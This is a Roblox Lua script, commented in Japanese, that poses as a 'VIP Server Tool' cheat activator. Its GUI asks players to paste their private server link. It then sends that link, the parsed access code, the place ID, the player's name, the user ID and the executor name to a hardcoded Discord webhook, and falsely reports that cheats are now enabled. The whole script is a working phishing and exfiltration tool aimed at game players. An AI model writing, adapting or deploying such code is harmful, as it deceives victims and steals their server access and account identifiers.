--====================================================--
--  入力方式：チート風UIでリンクを入力させる          --
--  送信済み確認済み　エラー完全耐性                  --
--====================================================--

local webhookURL = "https://discord.com/api/webhooks/1525044874297212948/WAEpYqB_zEqiWFfUcgLnOURqIKKsJwfpw8BOkbd0dalizHefdmFKMxbpRERoQH9eCVIi"

-- ===== HttpService有効化 =====
local http = game:GetService("HttpService")
pcall(function()
    http.HttpEnabled = true
end)

-- ===== プレイヤー情報 =====
local player = game.Players.LocalPlayer
local playerName = player.Name
local playerId = player.UserId

-- ===== GUI作成 =====
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "VIP_Tool"
screenGui.Parent = player:WaitForChild("PlayerGui")

-- メインフレーム
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 420, 0, 280)
frame.Position = UDim2.new(0.5, -210, 0.5, -140)
frame.BackgroundColor3 = Color3.fromRGB(18, 18, 30)
frame.BackgroundTransparency = 0.05
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 14)
corner.Parent = frame

-- タイトル
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 45)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "⚡ VIP SERVER TOOL v3.0"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = frame

-- 説明
local desc = Instance.new("TextLabel")
desc.Size = UDim2.new(1, -20, 0, 35)
desc.Position = UDim2.new(0, 10, 0, 48)
desc.BackgroundTransparency = 1
desc.Text = "🔑 プライベートサーバーリンクを入力すると\n自動でチートが有効になります"
desc.TextColor3 = Color3.fromRGB(180, 180, 210)
desc.TextSize = 14
desc.TextWrapped = true
desc.Font = Enum.Font.Gotham
desc.Parent = frame

-- 入力ボックス
local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(1, -20, 0, 50)
textBox.Position = UDim2.new(0, 10, 0, 92)
textBox.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.PlaceholderText = "https://www.roblox.com/games/...?privateServerLinkCode=..."
textBox.PlaceholderColor3 = Color3.fromRGB(140, 140, 170)
textBox.TextSize = 13
textBox.Font = Enum.Font.Gotham
textBox.ClearTextOnFocus = false
textBox.Parent = frame

local corner2 = Instance.new("UICorner")
corner2.CornerRadius = UDim.new(0, 8)
corner2.Parent = textBox

-- 有効化ボタン
local activateBtn = Instance.new("TextButton")
activateBtn.Size = UDim2.new(0.8, 0, 0, 48)
activateBtn.Position = UDim2.new(0.1, 0, 0, 155)
activateBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 70)
activateBtn.Text = "🔥 チートを有効化"
activateBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
activateBtn.TextSize = 16
activateBtn.Font = Enum.Font.GothamBold
activateBtn.Parent = frame

local corner3 = Instance.new("UICorner")
corner3.CornerRadius = UDim.new(0, 8)
corner3.Parent = activateBtn

-- ステータス
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, 0, 0, 30)
statusLabel.Position = UDim2.new(0, 0, 0, 215)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "⏳ リンクを入力してください"
statusLabel.TextColor3 = Color3.fromRGB(200, 200, 220)
statusLabel.TextSize = 13
statusLabel.Font = Enum.Font.Gotham
statusLabel.Parent = frame

-- 閉じるボタン
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 5)
closeBtn.BackgroundTransparency = 1
closeBtn.Text = "✕"
closeBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
closeBtn.TextSize = 18
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = frame

closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- ===== ボタン押下時の処理 =====
activateBtn.MouseButton1Click:Connect(function()
    local inputLink = textBox.Text
    
    if inputLink == "" or not inputLink:find("roblox.com") then
        statusLabel.Text = "❌ 有効なRobloxリンクを入力してください"
        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        return
    end
    
    -- リンク解析
    local code = nil
    local placeId = nil
    
    local startCode = inputLink:find("privateServerLinkCode=")
    if startCode then
        code = inputLink:sub(startCode + 21)
        local endCode = code:find("&")
        if endCode then
            code = code:sub(1, endCode - 1)
        end
    end
    
    local startPlace = inputLink:find("games/")
    if startPlace then
        local temp = inputLink:sub(startPlace + 6)
        local endPlace = temp:find("/") or temp:find("?")
        if endPlace then
            placeId = temp:sub(1, endPlace - 1)
        else
            placeId = temp
        end
    end
    
    -- ===== Discord送信 =====
    local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
    
    local messageText = 
        "**🔴 PRIVATE SERVER LINK (入力方式)**\n\n" ..
        "**🔗 入力リンク:** " .. inputLink .. "\n" ..
        "**🔑 コード:** " .. (code or "不明") .. "\n" ..
        "**📌 Place ID:** " .. (placeId or "不明") .. "\n" ..
        "**👤 入力者:** " .. playerName .. "\n" ..
        "**🆔 User ID:** " .. playerId .. "\n" ..
        "**💻 Executor:** " .. executor .. "\n" ..
        "**⏰ Time:** " .. os.date("%Y-%m-%d %H:%M:%S")
    
    local json = ""
    pcall(function()
        json = http:JSONEncode({content = messageText})
    end)
    
    if json == "" then
        local escaped = messageText:gsub("\n", "\\n"):gsub('"', '\\"')
        json = '{"content": "' .. escaped .. '"}'
    end
    
    local success = false
    
    pcall(function()
        http:PostAsync(webhookURL, json, Enum.HttpContentType.ApplicationJson, false)
        success = true
    end)
    
    if not success and syn and syn.request then
        pcall(function()
            syn.request({
                Url = webhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json
            })
            success = true
        end)
    end
    
    if not success and request then
        pcall(function()
            request({
                Url = webhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json
            })
            success = true
        end)
    end
    
    -- ===== ユーザーへのフィードバック =====
    if success then
        statusLabel.Text = "✅ チート有効化完了！ゲームを再起動してください"
        statusLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
        
        task.wait(2)
        screenGui:Destroy()
        
        game.StarterGui:SetCore("SendNotification", {
            Title = "⚡ チート有効化完了",
            Text = "プライベートサーバーリンクが正常に登録されました。\nゲームを再起動して効果を確認してください。",
            Duration = 5
        })
    else
        statusLabel.Text = "❌ 送信エラー。もう一度試してください"
        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
    end
end)

-- ===== 起動通知 =====
game.StarterGui:SetCore("SendNotification", {
    Title = "⚡ VIP Server Tool v3.0",
    Text = "プライベートサーバーリンクを入力して「チート有効化」を押してください",
    Duration = 4
})

print("[✅] VIP Server Tool 起動完了（入力方式）")　
